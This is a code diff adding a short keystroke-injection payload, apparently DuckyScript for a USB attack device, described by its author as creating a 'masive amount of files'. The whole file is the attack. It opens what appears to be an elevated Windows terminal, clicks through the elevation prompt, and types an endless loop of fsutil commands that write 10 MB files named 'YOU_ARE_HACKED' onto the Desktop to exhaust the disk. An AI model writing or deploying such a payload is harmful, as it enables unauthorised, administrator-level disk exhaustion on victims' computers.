@@ -1,0 +1,19 @@
+REM Author: vafc21
+REM Description: creates a masive amount of files
+REM Version: 1.5
+DELAY 1000
+GUI x
+DELAY 500
+STRING a
+DELAY 500
+LEFT_ARROW
+DELAY 500
+ENTER
+STRING cd Desktop
+ENTER
+STRING :loop
+ENTER
+STRING fsutil file createnew file%YOU_ARE_HACKED%.txt 10485760
+ENTER
+STRING goto loop
+ENTER
